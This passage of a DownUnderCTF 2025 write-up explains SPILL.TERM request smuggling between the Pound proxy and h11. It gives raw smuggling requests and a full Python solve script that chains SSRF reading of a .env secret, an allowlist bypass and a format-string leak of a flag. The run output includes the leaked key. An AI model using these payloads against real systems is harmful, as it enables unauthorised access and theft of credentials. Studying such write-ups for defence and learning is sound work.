
In this GitHub pull request, [Reject requests with oversized chunk bodies #43](https://github.com/graygnuorg/pound/pull/43), [@JeppW](https://github.com/JeppW) said:

> This PR tightens the parsing of chunked HTTP requests by rejecting requests with oversized chunks. By oversized chunks, I mean chunks where the body exceeds the chunk size indicated in the chunk header. E.g.:
> ```
> 5
> AAAAAXXX
> 0
> ```
>   
> Currently, pound logs this error, but 'allows it' (i.e. forwards the entire chunk as-is and lets the backend deal with it).
>   
> This behaviour is incorrect, and it can cause problems with some backends. Specifically, some HTTP parsers accept any 2-byte sequence as the line terminator of a chunk body (not checking that it is in fact a CRLF sequence). In such cases, pound and the backend will interpret the chunk boundaries differently, which can potentially lead to a request smuggling vulnerability.

In fact, this one is part of @JeppW research result. For more details, I highly recommend you read his amazing research on new technique in HTTP/1.1 request smuggling: [Funky chunks: abusing ambiguous chunk line terminators for request smuggling](https://w4ke.info/2025/06/18/funky-chunks.html).

In his research blog post, section "[TERM.SPILL and SPILL.TERM vulnerabilities](https://w4ke.info/2025/06/18/funky-chunks.html#termspill-and-spillterm-vulnerabilities)", we can see that proxy Pound and server h11 is vulnerable to SPILL.TERM HTTP/1.1 request smuggling:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250723142815.png)

Earlier we confirmed Pound in version 4.15 or prior is vulnerable to SPILL, is h11 in this challenge also vulnerable?

In `src/src/Dockerfile`, we can see that it installs h11 version 0.15.0:

```bash
[...]
RUN apt update && \
    apt install -y nginx libadns1-dev && \
    pip3 install h11==0.15.0 Flask==2.3.3 Flask-SQLAlchemy==3.1.1 requests==2.31.0 python-dotenv==1.1.0
```

Which is indeed vulnerable according to [this GitHub advisory](https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj).

In the above advisory, it has the following PoC:

```http
GET /one HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5
AAAAAXX2
45
0

GET /two HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

0


```

In the research blog post, this is called SPILL.TERM request smuggling, where the reverse proxy, Pound, **accepts oversize chunk body**, and the server, h11, **allows any 2 bytes line terminators** in chunked-coding message bodies, as it doesn't validate line terminators is a CRLF (`\r\n`) character.

Therefore, Pound will see 1 GET request to `/one`, and h11 will see 2 GET requests to `/one` and `/two`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250723144509.png)

In this case, Pound will not reject the oversize chunk body (`AAAAAXX2\r\n`), and h11 parses `XX` as the line terminator, `2\r\n` as the chunk header. Ultimately, this behavior creates a parser differential between Pound and h11, and the proxy side saw 1 request, where the server side saw 2 requests.

> Note: For more details on chunk header and body, I highly recommend you to read [his research blog post](https://w4ke.info/2025/06/18/funky-chunks.html)!

With that in mind, we can send the following request to bypass the `authorized_ips` check:

```http
GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
Transfer-Encoding: chunked

5
AAAAAXX2
84
0

GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
X-Forwarded-For: 127.0.0.1
Auth-Key: fake_token
Transfer-Encoding: chunked

0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250723145303.png)

Wait, why can't we see the smuggled request's response?

This is because the proxy only saw 1 request, therefore it should only respond back with 1 response!

Luckily, we can easily solve this limitation by tricking the proxy into thinking it has 2 requests. For more details on this, feel free to read section "[bypassing-front-end-rules](https://w4ke.info/2025/06/18/funky-chunks.html#bypassing-front-end-rules)" from his research blog post.

Another way to solve this limitation is to, well, add our IP address into the `authorized_ips` list attribute via endpoint `/update_allowlist`. If we don't know what IP address should we add, we can just send a GET request to the RPC service:

```http
GET / HTTP/1.1
Host: dev.rpc-service.ductf


```

```http
HTTP/1.1 403 
Content-Length: 127
Content-Type: text/plain

Access denied: You are not allowed:to access this service. Only 127.0.0.1 are allowed access.. 
The IP recieved was: 172.18.0.1
```

In my case, the IP address is `172.18.0.1`.

Then, we can add our own "backdoor" via the following smuggling request:

```http
GET /ping HTTP/1.1
Host: dev.rpc-service.ductf
Transfer-Encoding: chunked

5
AAAAAXX2
9b
0

GET /update_allowlist=172.18.0.1 HTTP/1.1
Host: dev.rpc-service.ductf
X-Forwarded-For: 127.0.0.1
Auth-Key: fake_token
Transfer-Encoding: chunked

0


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250723150059.png)

Finally, we can verify the list indeed updated by sending a GET request to the RPC service again:

![](https://github.com/siunam321/CTF-Writeups/blob/main/DownUnderCTF-2025/images/Pasted%20image%2020250723150132.png)

Now it didn't respond to us with the "Access denied" message and successfully bypassed the `authorized_ips` check!

## Exploitation

Armed with the above information, we can get the flag via:
1. Register and login a new account in service "Domain Scanner"
    1. Read the authentication key via SSRF to arbitrary file read
2. In service "RPC Service", get our request IP address by sending a GET request to the service
    1. Update the allow list with our request IP address by smuggling a GET request to `/update_allowlist` using SPILL.TERM technique
    2. Pollute/inject the `debug.log` file with our own format string vulnerability payload in endpoint `/stats`, which leaks the global variable `FLAG`
    3. Get the log via endpoint `/stats`

> Note: In the remote instance, our IP address will be rotated. So we need to update all of our IP addresses.

To automate the above steps, I've written the following Python solve script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import socket
import ssl
import random
import re
from string import ascii_letters

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.hostname = self.baseUrl.split('://')[-1]
        self.port = 80 if 'http://' in self.baseUrl else 443
        self.isLocalTesting = True if 'localhost' in self.baseUrl or self.port == 80 else False
        self.USERNAME = Solver.generateRandomString(10)
        self.PASSWORD = Solver.generateRandomString(10)
        self.GET_METHOD = 'GET'
        self.POST_METHOD = 'POST'
        self.CUSTOMER_APP_HOSTNAME = 'dev.customer.ductf'
        self.RPC_SERVICE_HOSTNAME = 'dev.rpc-service.ductf'
        self.CUSTOMER_APP_REGISTER_ENDPOINT = '/register'
        self.CUSTOMER_APP_LOGIN_ENDPOINT = '/login'
        self.RPC_SERVICE_UPDATE_ALLOWLIST_ENDPOINT = '/update_allowlist'
        self.RPC_SERVICE_GET_LOG_ENDPOINT = '/stats'
        self.CHUNK_LENGTH = 5
        self.CHUNK_PADDING = 'X' * 2
        self.MAX_RETRY_NUMBER = 10
    
    @staticmethod
    def generateRandomString(length):
        return ''.join(random.choice(ascii_letters) for i in range(length))

    def sendall(self, request):
        if self.isLocalTesting:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((self.hostname, self.port))
                sock.sendall(request.encode())
        else:
            # the remote instance should have SSL
            context = ssl.create_default_context()
            with socket.create_connection((self.hostname, self.port)) as sock:
                with context.wrap_socket(sock, server_hostname=self.hostname) as ssock:
                    ssock.sendall(request.encode())

    def registerCustomerApp(self):
        print(f'[*] Registering user {self.USERNAME} with password "{self.PASSWORD}"...')
        url = f'{self.baseUrl}{self.CUSTOMER_APP_REGISTER_ENDPOINT}'
        data = {
            'username': self.USERNAME,
            'password': self.PASSWORD
        }
        header = { 'Host': self.CUSTOMER_APP_HOSTNAME }
        response = self.session.post(url, data=data, headers=header, allow_redirects=False)
        if response.status_code != 302:
            print('[-] Failed to register a new account')
            exit()
        
        print('[+] Registered successfully')

    def loginCustomerApp(self):
        print(f'[*] Logging in as user {self.USERNAME}...')
        url = f'{self.baseUrl}{self.CUSTOMER_APP_LOGIN_ENDPOINT}'
        data = {
            'username': self.USERNAME,
            'password': self.PASSWORD
        }
        header = { 'Host': self.CUSTOMER_APP_HOSTNAME }
        response = self.session.post(url, data=data, headers=header, allow_redirects=False)
        if response.status_code != 302:
            print(f'[-] Failed to log in as user {self.USERNAME}')
            exit()
        
        print('[+] Logged in successfully')

    def readAuthenticationKeyViaSSRF(self):
        print('[*] Reading authentication key via SSRF...')
        data = { 'url': ' file:///home/customerapp/customer_app/.env' }
        header = { 'Host': self.CUSTOMER_APP_HOSTNAME }
        responseText = self.session.post(self.baseUrl, data=data, headers=header).text

        if self.isLocalTesting:
            authenticationKeyRegex = re.compile(r'AUTHENTICATION_KEY=(.*)')
        else:
            authenticationKeyRegex = re.compile(r'AUTHENTICATION_KEY=([0-9a-f]+)')
        authenticationKeyMatch = re.search(authenticationKeyRegex, responseText)
        if authenticationKeyMatch is None:
            print('[-] Failed to read the authentication key')
            exit()
        
        print(f'[+] Got authentication key: {authenticationKeyMatch.group(1)}')
        return authenticationKeyMatch.group(1)

    def getRequestClientIp(self):
        header = { 'Host': self.RPC_SERVICE_HOSTNAME }
        # use a new HTTP connection to get rotated IP addresses
        responseText = requests.get(self.baseUrl, headers=header).text
        clientIpMatch = re.search(r'The IP recieved was: (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', responseText)
        if clientIpMatch is None:
            print('[-] Failed to get request client IP address')
            exit()
        
        print(f'[+] Client IP address: {clientIpMatch.group(1)}')
        return clientIpMatch.group(1)

    def updateAllowListViaRequestSmuggling(self, authenticationKey):
        # in the remote instance, our client IP address will be rotated, 
        # so we'll just keep trying until all possible IP addresses are
        # updated
        retriesNumber = 1 if self.isLocalTesting else self.MAX_RETRY_NUMBER
        clientIps = set([self.getRequestClientIp() for _ in range(retriesNumber)])
        for clientIp in clientIps:
            print(f'[*] Updating allow list to allow IP address {clientIp}...')

            # https://w4ke.info/2025/06/18/funky-chunks.html#spillterm
            h11Request = f'0\r\n\r\n{self.GET_METHOD} {self.RPC_SERVICE_UPDATE_ALLOWLIST_ENDPOINT}={clientIp} HTTP/1.1\r\nHost: {self.RPC_SERVICE_HOSTNAME}\r\nX-Forwarded-For: 127.0.0.1\r\nAuth-Key: {authenticationKey}\r\nTransfer-Encoding: chunked\r\n'
            h11RequestLength = hex(len(h11Request))[2:]
            
            poundRequest = f'{self.GET_METHOD} / HTTP/1.1\r\nHost: {self.RPC_SERVICE_HOSTNAME}\r\nTransfer-Encoding: chunked\r\n\r\n{self.CHUNK_LENGTH}\r\n{"A" * self.CHUNK_LENGTH}{self.CHUNK_PADDING}{len(h11RequestLength)}\r\n{h11RequestLength}\r\n{h11Request}\r\n0\r\n\r\n'
            self.sendall(poundRequest)
            
        print('[+] The allow list should be updated')

    def getLogWithoutUrlEncode(self, parameter, authenticationKey):
        print(f'[*] Getting log with parameter (Without URL encoding): {parameter}')
        request = f'''{self.GET_METHOD} {self.RPC_SERVICE_GET_LOG_ENDPOINT}?{parameter} HTTP/1.1
Host: {self.RPC_SERVICE_HOSTNAME}
Auth-Key: {authenticationKey}

'''
        self.sendall(request)

    def getLog(self, parameter, authenticationKey):
        print(f'[*] Getting log with parameter: {parameter}')
        url = f'{self.baseUrl}{self.RPC_SERVICE_GET_LOG_ENDPOINT}'
        headers = {
            'Host': self.RPC_SERVICE_HOSTNAME,
            'Auth-Key': authenticationKey
        }
        response = self.session.get(url, headers=headers, params=parameter)
        return response.text

    def solve(self):
        self.registerCustomerApp()
        self.loginCustomerApp()
        authenticationKey = self.readAuthenticationKeyViaSSRF()

        self.updateAllowListViaRequestSmuggling(authenticationKey)
        polluteLogWithFormatStringVulnParameter = '{config.__init__.__globals__[FLAG]}'
        self.getLogWithoutUrlEncode(polluteLogWithFormatStringVulnParameter, authenticationKey)

        getLogParameter = { 'get_log': True }
        responseText = self.getLog(getLogParameter, authenticationKey)
        flagMatch = re.search(r'(DUCTF{.*})', responseText)
        if flagMatch is None:
            print('[-] Failed to read the flag')
            exit()

        print(f'[+] Flag: {flagMatch.group(1)}')

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'https://sodium-2843934946c48476.iso.2025.ductf.net'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/DownUnderCTF-2025/web/sodium/src)-[2025.07.23|15:08:55(HKT)]
└> python3 solve.py    
[*] Registering user DqXxJwOSxW with password "cUaRrEvBPH"...
[+] Registered successfully
[*] Logging in as user DqXxJwOSxW...
[+] Logged in successfully
[*] Reading authentication key via SSRF...
[+] Got authentication key: 2e48228116c6ae588ba6155859f0f2cf67e81f01
[+] Client IP address: 10.104.1.29
[+] Client IP address: 10.104.1.22
[+] Client IP address: 10.104.1.22
[+] Client IP address: 10.104.1.22
[+] Client IP address: 10.104.1.29
[+] Client IP address: 10.104.1.29
[+] Client IP address: 10.104.1.29
[+] Client IP address: 10.104.1.22
[+] Client IP address: 10.104.1.29
[+] Client IP address: 10.104.1.29
[*] Updating allow list to allow IP address 10.104.1.29...
[*] Updating allow list to allow IP address 10.104.1.22...
[+] The allow list should be updated
[*] Getting log with parameter (Without URL encoding): {config.__init__.__globals__[FLAG]}
[*] Getting log with parameter: {'get_log': True}
[+] Flag: DUCTF{th3y_s33_m3_smuggl1ng_4nd_ch41n1ng}
```

- **Flag: `DUCTF{th3y_s33_m3_smuggl1ng_4nd_ch41n1ng}`**

## Conclusion

What we've learned:

1. SSRF to arbitrary file read
2. SPILL.TERM HTTP/1.1 request smuggling
3. Python format string vulnerability